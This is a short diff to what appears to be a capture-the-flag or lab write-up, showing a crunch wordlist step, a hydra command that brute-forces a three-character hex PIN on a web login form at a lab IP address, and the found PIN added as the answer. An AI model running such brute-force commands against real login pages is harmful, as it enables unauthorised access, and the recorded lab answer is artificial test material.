@@ -26,14 +26,17 @@ crunch 3 3 0123456789ABCDEF -o 3digits.txt
 
  
 #### Using the Password List
-![image](5(1).png)
 ```bash
 hydra -l '' -P 3pass.txt -f -v 10.10.172.65 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
 ```
+![image](5(1).png)
+
 #### Found Pin:
 ![image](6.png)
 
-
+```python
+6F5
+```
 ![image](7.png)
 
 
